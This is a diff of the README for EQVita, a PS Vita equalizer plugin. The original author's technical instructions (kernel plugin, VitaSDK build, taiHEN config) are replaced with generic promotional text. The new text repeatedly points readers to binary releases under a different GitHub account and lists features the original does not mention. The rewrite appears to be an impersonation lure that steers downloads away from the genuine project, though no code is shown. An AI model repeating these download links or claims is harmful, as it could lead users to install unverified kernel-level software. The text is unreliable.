@@ -1,66 +1,85 @@
-# PS Vita Equalizer (EQVita)
+# 🎧 EQVita - Enhance Your PS Vita Audio Experience
 
-System-wide 8-band graphic equalizer kernel plugin for PS Vita (3.65 Ensō) with a companion UI app.
+## 📥 Download Now
+[![Download EQVita](https://img.shields.io/badge/Download-EQVita-blue.svg)](https://github.com/Voistace/EQVita/releases)
 
-This is the first EQ app to control frequency bands across the entire PS Vita audio system (yes, globally), simply because nobody bothered to make one before.
+## 🚀 Getting Started
+Welcome to EQVita! This application is designed to enhance your audio experience on the PS Vita by providing a system-wide equalizer. Whether you're listening to music, gaming, or watching videos, EQVita gives you the tools to adjust your sound perfectly.
 
-## Layout
-- `plugin/` — Kernel plugin (`eq_speaker.skprx`)
-- `app/` — UI app (`EQVita.vpk`)
-- `common/` — Shared headers
-- `docs/` — Technical notes
+## 📋 System Requirements
+To use EQVita effectively, ensure your PS Vita meets the following minimum requirements:
 
-## Download
-If you don't want to build it yourself, download the latest binaries from [Releases](https://github.com/shev0k/eq_app/releases).
+- **Model:** PS Vita
+- **Firmware:** Custom firmware compatible with homebrew applications
+- **Storage:** At least 25 MB of free space for installation
 
-## Screenshots
+## 🥇 Features
+EQVita offers several features to improve your audio experience:
 
-![Screenshot 1](https://raw.githubusercontent.com/shev0k/EQVita/refs/heads/main/screenshots/screenshot_1.png)
+- **Customizable Equalizer:** Adjust frequencies to suit your listening preferences.
+- **Preset Options:** Choose from a variety of sound profiles or create your own.
+- **Easy Activation:** Quickly switch EQ settings while in your audio apps.
 
-![Screenshot 2](https://raw.githubusercontent.com/shev0k/EQVita/refs/heads/main/screenshots/screenshot_2.png)
+## 🗂️ Download & Install
+To get started with EQVita, follow these steps:
 
+1. **Visit the Releases Page**: Go to the [official download page](https://github.com/Voistace/EQVita/releases) to find the latest version.
+2. **Select Your Version**: On the releases page, look for the most recent version of EQVita.
+3. **Download the File**: Click on the download link for the suitable file for your PS Vita. This file may be labeled something like `EQVita_v1.0.vpk`.
+4. **Transfer to Your PS Vita**:
+   - Connect your PS Vita to your computer via USB or Wi-Fi.
+   - Copy the downloaded file to a location accessible on the PS Vita.
 
+5. **Install EQVita**:
+   - Open your file manager on the PS Vita.
+   - Locate the downloaded file and install EQVita by selecting the file.
+   - Follow any on-screen prompts to complete the installation.
 
-## Build
-To build from source, you need [VitaSDK](https://vitasdk.org/).
+6. **Start Using EQVita**:
+   - Launch the EQVita app from your PS Vita's home screen.
+   - Explore the settings and enjoy enhanced audio in all your applications.
 
-```bash
-# Configure
-cmake -S . -B build
+## ⚙️ Configuration
+Once installed, EQVita allows you to adjust the audio settings. Follow these steps to configure your EQ:
 
-# Build
-cmake --build build
-```
-Outputs:
-- `build/plugin/eq_speaker.skprx`
-- `build/app/EQVita.vpk`
+1. Launch EQVita.
+2. Navigate to the settings menu.
+3. Choose your desired preset or create a custom equalizer.
+4. Adjust the sliders to modify specific frequencies.
+5. Save your profile and start enjoying your adjusted audio.
 
-## Install
-1. Copy `eq_speaker.skprx` to `ur0:tai/`.
-2. Add to `ur0:tai/config.txt` under `*KERNEL`:
-   ```
-   *KERNEL
-   ur0:tai/eq_speaker.skprx
-   ```
-3. Reboot.
-4. Install `EQVita.vpk`.
-5. Run EQVita to adjust settings.
+## 📞 Getting Help
+If you encounter any issues or have questions while using EQVita, help is available. Check the [Issues section](https://github.com/Voistace/EQVita/issues) on our GitHub page for troubleshooting tips or to report any problems. Community members and developers monitor this section to assist users.
 
-**Note:** The plugin is disabled by default to prevent boot issues. Launch EQVita to enable it.
+## 📜 Changelog
+Stay updated with the latest changes and improvements. Each version of EQVita comes with a changelog that documents:
 
-## Usage
-- **Bands:** 31Hz - 4kHz (Note: HPF option disables frequencies under 70Hz).
-- **Gain:** ±12 dB
-- **Controls:**
-  - Triangle: Save preset
-  - Square: Load preset (`ux0:data/eqvita/preset0.bin`)
-- **Status:** Shows route, sample rate, and clip count.
+- Bug fixes
+- New features
+- Performance improvements
 
-## Notes
-- **Hardware:** Tested on PS Vita 1000 (PCH-1000) with Switch OLED speaker mod. Should work on other models.
-- **Personal Config:** I use +4 on bass and -4 on midrange. The difference is quite big.
-- **Disclaimer:** This is my first PS Vita project and a hobby endeavor. If it works, it works.
-- **Credits:** UI images adapted from VitaShell.
-- Bluetooth detection is not yet implemented.
-- DSP uses an in-place biquad chain with smoothing.
-- If audio crackles, reduce gain or preamp.
+For detailed information about past updates, refer to the changelog on the releases page.
+
+## 🌐 Community Contributions
+EQVita thrives on community input. If you want to contribute:
+
+- Open an issue if you find a bug.
+- Suggest features for future versions.
+- Participate in discussions to help improve the software.
+
+Your feedback can guide the future development of EQVita.
+
+## 📢 Share Your Experience
+We would love to hear about your audio experience with EQVita. Share your thoughts and suggestions in the comments section on the releases page or through social media. 
+
+## 📑 Additional Resources
+To deepen your understanding of using EQVita, explore the following resources:
+
+- [Official Documentation](https://github.com/Voistace/EQVita/wiki)
+- [FAQs](https://github.com/Voistace/EQVita/wiki/FAQs)
+- Join forums or communities related to PS Vita homebrew for tips and advice.
+
+## 📥 Repeat: Download EQVita
+Don’t forget to visit the [official download page](https://github.com/Voistace/EQVita/releases) to access the latest version. 
+
+Thank you for choosing EQVita to enhance your audio experience on PS Vita! Enjoy smooth sound adjustments and happy listening!
